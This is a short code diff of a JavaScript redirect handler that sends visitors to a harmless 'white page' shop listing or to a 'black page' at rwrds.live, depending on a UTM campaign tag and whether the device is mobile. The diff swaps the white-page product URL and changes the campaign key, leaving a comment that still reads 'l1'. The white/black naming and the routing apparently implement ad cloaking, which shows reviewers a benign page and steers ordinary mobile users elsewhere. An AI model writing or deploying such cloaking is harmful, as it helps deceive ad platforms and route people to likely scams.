@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://castleplanethk.com/products/pre-order-hkdl-grey-and-white-flerken-cat-squeeze-toy";
+    const whitePageURL = "https://plushiedepot.com/products/lifelike-plush-blue-whale";
     const blackPageURL = "https://rwrds.live";
   
     // Parse the UTM parameters from the request URL
@@ -12,7 +12,7 @@ export default function handler(req, res) {
     const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
   
     // Redirection logic
-    if (utmCampaign === 'l1') {
+    if (utmCampaign === 'l2') {
       // UTM campaign 'l1' takes priority for both desktop and mobile
       res.writeHead(302, { Location: whitePageURL });
     } else if (isMobileDevice) {
